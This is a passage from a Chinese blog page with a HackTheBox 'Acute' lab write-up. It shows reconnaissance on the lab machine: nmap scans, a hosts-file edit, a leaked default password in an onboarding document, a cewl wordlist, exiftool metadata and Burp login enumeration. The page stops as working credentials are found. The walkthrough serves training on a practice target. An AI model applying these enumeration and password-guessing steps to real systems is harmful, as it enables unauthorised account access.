@@ -1,0 +1,858 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：网站信息分析（获取人员ID）、员工入职手册信息泄露（默认密码泄露）、cewl生成字典、exiftool分析文档、nc获取反弹shell、主机多人登录情况、msf监控截图、PS命令行中生成用户session进行读取flag、ps脚本分析、本地管理员转储SAM文件并破解、密码复用、bat脚本编辑、">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Acute-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/04/16/Acute-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：网站信息分析（获取人员ID）、员工入职手册信息泄露（默认密码泄露）、cewl生成字典、exiftool分析文档、nc获取反弹shell、主机多人登录情况、msf监控截图、PS命令行中生成用户session进行读取flag、ps脚本分析、本地管理员转储SAM文件并破解、密码复用、bat脚本编辑、">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Acute-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Acute-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Acute-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Acute-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Acute-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Acute-htb-writeup/6.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Acute-htb-writeup/7.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Acute-htb-writeup/8.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Acute-htb-writeup/9.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Acute-htb-writeup/10.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Acute-htb-writeup/11.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Acute-htb-writeup/12.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Acute-htb-writeup/13.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Acute-htb-writeup/14.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Acute-htb-writeup/15.png">
+<meta property="article:published_time" content="2024-04-16T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-05-05T14:20:00.321Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Acute-htb-writeup/1.png">
+  
+  
+  
+  <title>Acute-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
+                    
+                    <span>简易反弹shell集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Acute-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-04-16 23:50" pubdate>
+          2024年4月16日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          32k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          264 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Acute-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：网站信息分析（获取人员ID）、员工入职手册信息泄露（默认密码泄露）、cewl生成字典、exiftool分析文档、nc获取反弹shell、主机多人登录情况、msf监控截图、PS命令行中生成用户session进行读取flag、ps脚本分析、本地管理员转储SAM文件并破解、密码复用、bat脚本编辑、</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://siunam321.github.io/ctf/hackthebox/Acute/</code></p>
+<p>参考链接：<code>https://0xdf.gitlab.io/2022/07/16/htb-acute.html</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、靶机官方介绍</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Acute 是一台硬 Windows 机器，以端口“<span class="hljs-number">443</span>”上的网站启动。该网站的证书显示域名“atsserver.acute.local”。环顾该网站，提到了几名员工，利用这些信息，可以构建远程计算机上可能的用户列表。列举该网站会显示一个表格，其中包含有关公司新员工的程序。该表格显示所有帐户最初设置的默认密码。它还显示了“Windows PowerShell Web Access”(PSWA) 会话的链接。结合枚举过程中的所有可用信息，攻击者能够以“Acute-PC01”上的用户“edavies”进入 PowerShell 会话。然后，发现用户“edavies”也使用交互式会话登录。通过监视“edavie”的操作，可以检索“ATSSERVER”的“imonks”用户的明文密码。用户“imonks”在“ATSSERVER”上的“Just Enough Administration”（JEA）下运行，但即使使用有限的命令集，攻击者也能够修改“ATSSERVER”上的脚本，以使“edavies”成为本地管理员在“Acute-PC01”上。现在“edavies”是本地管理员，可以从系统中检索“HKLM\sam”和“HKLM\system”，以提取所有用户的密码哈希值。管理员的哈希结果是可破解的，并且明文密码被重新用于“ATSSERVER”上的“awallace”。用户“awallace”能够在用户“Lois”执行的目录中创建“BAT”脚本。 “Lois”有权将“imonks”添加到“site_admin”组，而该组又有权访问“Domain Admins”组。因此，将“imonks”添加到“site_admin”组后，他可以将自己添加到“Domain Admins”组并获取管理权限。<br></code></pre></td></tr></table></figure>
+
+<p>2、获取下靶机IP地址：10.10.11.145</p>
+<p>3、探测下开放端口情况</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate=<span class="hljs-number">10000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.145</span> -oG allports -Pn<br>[sudo] kali 的密码：<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-04-16 18:54 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.145</span><br>Host is up (<span class="hljs-number">1.9</span>s latency).<br>Not shown: <span class="hljs-number">65534</span> filtered tcp ports (no-response)<br>PORT    STATE SERVICE<br><span class="hljs-number">443</span>/tcp open  https<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">34.02</span> seconds<br>                                                                                                                                                                                        <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p443 -sC -sV <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.145</span>                        <br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-04-16 18:54 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.145</span><br>Host is up (<span class="hljs-number">0.31</span>s latency).<br><br>PORT    STATE SERVICE  VERSION<br><span class="hljs-number">443</span>/tcp open  ssl/http Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)<br>|_ssl-date: <span class="hljs-number">2024</span><span class="hljs-number">-04</span><span class="hljs-number">-16</span>T02:<span class="hljs-number">53</span>:<span class="hljs-number">29</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; <span class="hljs-number">-8</span>h03m11s from scanner time.<br>| ssl-cert: Subject: commonName=atsserver.acute.local<br>| Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver<br>| Not valid before: <span class="hljs-number">2022</span><span class="hljs-number">-01</span><span class="hljs-number">-06</span>T06:<span class="hljs-number">34</span>:<span class="hljs-number">58</span><br>|_Not valid after:  <span class="hljs-number">2030</span><span class="hljs-number">-01</span><span class="hljs-number">-04</span>T06:<span class="hljs-number">34</span>:<span class="hljs-number">58</span><br>| tls-alpn: <br>|_  http/<span class="hljs-number">1.1</span><br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>|_clock-skew: <span class="hljs-number">-8</span>h03m11s<br><br>Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">103.37</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>4、把上面端口扫描发现的域名地址，本地做一下绑定</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ echo <span class="hljs-string">&quot;10.10.11.145 atsserver.acute.local acute.local&quot;</span> | sudo tee -a /etc/hosts<br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.145</span> atsserver.acute.local acute.local<br></code></pre></td></tr></table></figure>
+
+<p>5、开放访问下网站看看</p>
+<p><code>https://10.10.11.145/</code><br><code>https://acute.local/</code></p>
+<p><img src="http://sh1yan.top/photo/Acute-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>https://atsserver.acute.local/</code></p>
+<p><img src="http://sh1yan.top/photo/Acute-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>6、经过阅读网站信息，发现了一个docx的文档材料，且在关于页面上还发现了一些人名的介绍</p>
+<p><code>https://atsserver.acute.local/about.html</code></p>
+<p><img src="http://sh1yan.top/photo/Acute-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Acute-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Who we work with<br>我们的合作伙伴<br><br>Acute Health work with healthcare providers, councils and NHS units in the UK, training over <span class="hljs-number">10</span>,<span class="hljs-number">000</span> nurses, managers and healthcare workers every year. Some of our more established team members have been included <span class="hljs-keyword">for</span> multiple awards, these members include Aileen Wallace, Charlotte Hall, Evan Davies, Ieuan Monks, Joshua Morgan, and Lois Hopkins. Each of whom have come away with special accolades from the Healthcare community.<br>Acute Health与英国的医疗服务提供者，议会和NHS单位合作，每年培训<span class="hljs-number">10</span>，<span class="hljs-number">000</span>多名护士，管理人员和医疗保健工作者。我们的一些更成熟的团队成员已被列入多个奖项，这些成员包括艾琳华莱士，夏洛特霍尔，埃文戴维斯，伊恩蒙克斯，约书亚摩根，和洛伊斯霍普金斯。他们中的每一个人都获得了医疗保健界的特别赞誉。<br></code></pre></td></tr></table></figure>
+
+<p>7、下面分析下这个docx文档内容</p>
+<p><code>https://atsserver.acute.local/New_Starter_CheckList_v7.docx</code></p>
+<p><img src="http://sh1yan.top/photo/Acute-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Acute-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">这个文档可以看出来是一个新员工入职的介绍手册。<br><br>本大学的教职员介绍页可在以下网页找到：https:<span class="hljs-comment">//atsserver.acute.local/Staff</span><br>员工介绍门户网站可在这里找到：https:<span class="hljs-comment">//atsserver.acute.local/Staff/Induction</span><br><br>Arrange <span class="hljs-keyword">for</span> the new starter to receive a demonstration on using IT tools which may include MUSE, myJob and Google accounts. Walk the new starter through the password change policy, they will need to change it from the <span class="hljs-keyword">default</span> Password1!. Not all staff are changing these so please be sure to run through this.<br><br>安排新的启动器接收一个关于使用IT工具的演示，其中可能包括MUSE、myJob和谷歌帐户。让新的启动程序通过密码更改策略，他们将需要更改它从默认的密码<span class="hljs-number">1</span>！。并不是所有的员工都在改变这些内容，所以请务必完成这些工作。<br><br>这个文档的这一段话泄露了账号的默认密码：Password1!<br></code></pre></td></tr></table></figure>
+
+<p>8、结合已有信息，我们获取到了一些疑似的账号和一个默认密码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">Aileen Wallace<br>Charlotte Hall<br>Evan Davies<br>Ieuan Monks<br>Joshua Morgan<br>Lois Hopkins<br></code></pre></td></tr></table></figure>
+
+<p>9、但是还是缺少一些信息，继续查看文档内容</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">Arrange initial probation meeting between Probationer, Head of Department and Probation Adviser.<br><br>Run through the new PSWA to highlight the restrictions <span class="hljs-built_in">set</span> on the sessions named dc_manage.<br><br>The probation plan should be completed within a month of the start date and should include a requirement to <span class="hljs-keyword">register</span> with LETs re: rate to gain within <span class="hljs-number">3</span> months of starting. Fellowship of the Higher Education Academy (FHEA). <br><br>安排申请人、部门主管和缓刑顾问的初步试用期会议。<br><br>运行新的PSWA以突出显示对名为dc_manage的会话设置的限制。<br><br>试用期计划应在开始日期后的一个月内完成，并应包括一个要求注册的要求：在开始后的<span class="hljs-number">3</span>个月内获得的费率。美国高等教育学院奖学金（FHEA）。<br><br>https:<span class="hljs-comment">//atsserver.acute.local/Acute_Staff_Access</span><br><br>https:<span class="hljs-comment">//atsserver.acute.local/Acute_Staff_Access/en-US/logon.aspx?ReturnUrl=%2fAcute_Staff_Access</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Acute-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
+<p>10、这里先使用下列工具，再生成一些用户姓名字典内容，在关于页面上。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ cewl https:<span class="hljs-comment">//atsserver.acute.local/about.html -w userlist.txt</span><br>CeWL <span class="hljs-number">6.1</span> (Max Length) Robin <span class="hljs-title function_">Wood</span> <span class="hljs-params">(robin@digi.ninja)</span> <span class="hljs-params">(https:<span class="hljs-comment">//digi.ninja/)</span></span><br><span class="hljs-params">                           </span><br><span class="hljs-params">┌──(kali㉿offsec)-[~/Desktop]</span><br><span class="hljs-params">└─$ file userlist.txt                                            </span><br><span class="hljs-params">userlist.txt: ASCII text</span><br><span class="hljs-params">                              </span><br><span class="hljs-params">┌──(kali㉿offsec)-[~/Desktop]</span><br><span class="hljs-params">└─$ cat userlist.txt                                             </span><br><span class="hljs-params">and</span><br><span class="hljs-params">Training</span><br><span class="hljs-params">training</span><br><span class="hljs-params"><span class="hljs-keyword">for</span></span><br><span class="hljs-params">the</span><br><span class="hljs-params">Health</span><br><span class="hljs-params">healthcare</span><br><span class="hljs-params">Acute</span><br><span class="hljs-params">courses</span><br><span class="hljs-params">Face</span><br><span class="hljs-params">Care</span><br><span class="hljs-params">are</span><br><span class="hljs-params">File</span><br><span class="hljs-params">directory</span><br><span class="hljs-params">not</span><br><span class="hljs-params">found</span><br><span class="hljs-params">.....</span><br></code></pre></td></tr></table></figure>
+
+<p>11、再使用 exiftool 分析下文档材料</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Downloads]<br>└─$ exiftool ./New_Starter_CheckList_v7.docx                                      <br>ExifTool Version Number         : <span class="hljs-number">12.70</span><br>File Name                       : New_Starter_CheckList_v7.docx<br>Directory                       : .<br>File Size                       : <span class="hljs-number">35</span> kB<br>File Modification Date/Time     : <span class="hljs-number">2024</span>:<span class="hljs-number">04</span>:<span class="hljs-number">17</span> <span class="hljs-number">04</span>:<span class="hljs-number">49</span>:<span class="hljs-number">43</span>+<span class="hljs-number">08</span>:<span class="hljs-number">00</span><br>File Access Date/Time           : <span class="hljs-number">2024</span>:<span class="hljs-number">04</span>:<span class="hljs-number">17</span> <span class="hljs-number">04</span>:<span class="hljs-number">50</span>:<span class="hljs-number">11</span>+<span class="hljs-number">08</span>:<span class="hljs-number">00</span><br>File Inode Change Date/Time     : <span class="hljs-number">2024</span>:<span class="hljs-number">04</span>:<span class="hljs-number">17</span> <span class="hljs-number">04</span>:<span class="hljs-number">49</span>:<span class="hljs-number">58</span>+<span class="hljs-number">08</span>:<span class="hljs-number">00</span><br>File Permissions                : -rw-r--r--<br>File Type                       : DOCX<br>File Type Extension             : docx<br>MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document<br>Zip Required Version            : <span class="hljs-number">20</span><br>Zip Bit Flag                    : <span class="hljs-number">0x0006</span><br>Zip Compression                 : Deflated<br>Zip Modify Date                 : <span class="hljs-number">1980</span>:<span class="hljs-number">01</span>:<span class="hljs-number">01</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>Zip CRC                         : <span class="hljs-number">0x079b7eb2</span><br>Zip Compressed Size             : <span class="hljs-number">428</span><br>Zip Uncompressed Size           : <span class="hljs-number">2527</span><br>Zip File Name                   : [Content_Types].xml<br>Creator                         : FCastle<br>Description                     : Created on Acute-PC01<br>Last Modified By                : Daniel<br>Revision Number                 : <span class="hljs-number">8</span><br>Last Printed                    : <span class="hljs-number">2021</span>:<span class="hljs-number">01</span>:<span class="hljs-number">04</span> <span class="hljs-number">15</span>:<span class="hljs-number">54</span>:<span class="hljs-number">00</span>Z<br>Create Date                     : <span class="hljs-number">2021</span>:<span class="hljs-number">12</span>:<span class="hljs-number">08</span> <span class="hljs-number">14</span>:<span class="hljs-number">21</span>:<span class="hljs-number">00</span>Z<br>Modify Date                     : <span class="hljs-number">2021</span>:<span class="hljs-number">12</span>:<span class="hljs-number">22</span> <span class="hljs-number">00</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>Z<br>Template                        : Normal.dotm<br>Total Edit Time                 : <span class="hljs-number">2.6</span> hours<br>Pages                           : <span class="hljs-number">3</span><br>Words                           : <span class="hljs-number">886</span><br>Characters                      : <span class="hljs-number">5055</span><br>Application                     : Microsoft Office Word<br>Doc Security                    : None<br>Lines                           : <span class="hljs-number">42</span><br>Paragraphs                      : <span class="hljs-number">11</span><br>Scale Crop                      : No<br>Heading Pairs                   : Title, <span class="hljs-number">1</span><br>Titles Of Parts                 : <br>Company                         : University of Marvel<br>Links Up To Date                : No<br>Characters With Spaces          : <span class="hljs-number">5930</span><br>Shared Doc                      : No<br>Hyperlinks Changed              : No<br>App Version                     : <span class="hljs-number">16.0000</span><br></code></pre></td></tr></table></figure>
+
+<p>12、那就开始使用burp开始枚举吧</p>
+<p><img src="http://sh1yan.top/photo/Acute-htb-writeup/8.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Acute-htb-writeup/9.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Acute-htb-writeup/10.png" srcset="/img/loading.gif" lazyload></p>
+<p>13、到这里就发现了可以登录的账号密码了</p>
